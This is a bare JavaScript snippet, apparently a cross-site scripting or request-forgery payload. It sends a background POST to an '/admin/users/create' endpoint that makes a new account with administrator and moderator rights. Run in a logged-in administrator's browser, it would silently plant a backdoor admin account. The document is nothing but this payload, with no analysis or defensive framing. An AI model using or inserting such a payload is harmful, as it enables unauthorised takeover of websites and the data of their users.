var http = new XMLHttpRequest();
var url = '/admin/users/create';
var params = 'name=randomusername&email=newadmin@user.ltd&isAdmin=true&isMod=true';
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);
